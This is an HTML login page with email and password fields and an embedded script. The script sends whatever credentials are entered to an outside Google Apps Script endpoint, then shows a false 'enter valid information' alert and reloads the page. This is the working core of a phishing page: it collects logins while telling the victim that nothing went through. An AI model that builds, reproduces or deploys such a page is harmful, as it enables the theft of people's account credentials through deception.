    <div class="wrapper">
        <div class="form-box login">
        <h2>LoGiN</h2>

        <form method="post" action="" name="contactform" id="contact">
            <div class="input-box">
            <span class="icon"></span>
            <input type="email" name="Email" required>
            <label>Email</label>
        </div>
        <div class="input-box">
            <span class ="icon"></span>
            <input type="password" name="Password" required>
            <label>Password</label>
        </div>
        <div class="remember-forget">
            <label><input type="checkbox">
                Remember Me</label>
        </div>
        <button type="submit" class="btn">Login</button>
        </form>
        <!-- <div class="login-register"> -->
            <!-- <p>Don't Have an accout?</p> -->
</div>
<script>
    const scriptURL = 'https://script.google.com/macros/s/AKfycbzPEugYAvL4rxVPmMX49WzcLa46lp361I_-jZKE2uyfnVrnxAxLbYdThhkPUUF_Zc2uXg/exec'
    const form = document.forms['contactform']
    form.addEventListener('submit', e => {
      e.preventDefault()
      fetch(scriptURL, { method: 'POST', body: new FormData(form)})
        .then(response => alert("Please! Enter valid Information." ))
        .then(() => {  window.location.reload(); })
        .catch(error => console.error('Error!', error.message))
    })
  </script>
